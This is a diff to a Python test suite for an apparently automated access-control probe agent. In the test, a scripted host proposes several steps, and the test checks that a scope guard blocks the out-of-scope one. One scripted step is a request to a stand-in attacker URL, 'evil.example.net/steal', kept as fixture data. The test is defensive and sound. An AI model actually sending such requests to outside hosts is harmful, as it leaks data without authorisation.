@@ -191,7 +191,7 @@ class ScriptedHost:
     def __init__(self, replies):
         self.replies, self.calls, self.broken = list(replies), [], None
 
-    def call(self, system, prompt, timeout, budget):
+    def call(self, system, prompt, timeout, budget, *, schema=None):
         self.calls.append(timeout)
         return self.replies.pop(0)
 
@@ -594,7 +594,9 @@ def test_loop_runs_host_steps_through_the_scope_guard():
     host = ScriptedHost([HostReply(step=_wire("http_request", path="https://evil.example.net/steal")),
                          HostReply(step=_wire("http_request", path="/rest/basket/2")),
                          HostReply(step=_wire("submit_verdict", verdict="not-reproducible", rationale="404")),
-                         HostReply(step=_wire("submit_verdict", verdict="inconclusive", rationale="missing proof"))])
+                         HostReply(step=_wire("submit_verdict", verdict="inconclusive", rationale="missing proof")),
+                         HostReply(step={"action": "review", "status": "clear", "issues": [],
+                                         "steps": [], "pointer": None, "offset": 0})])
     res = AgentProbe("access-control", lambda: HostPlanner(host), max_steps=5).run(ctx)
     assert res.verdict == "inconclusive"
     assert sent == ["https://shop.example.com/rest/basket/2"]          # the out-of-scope step was refused
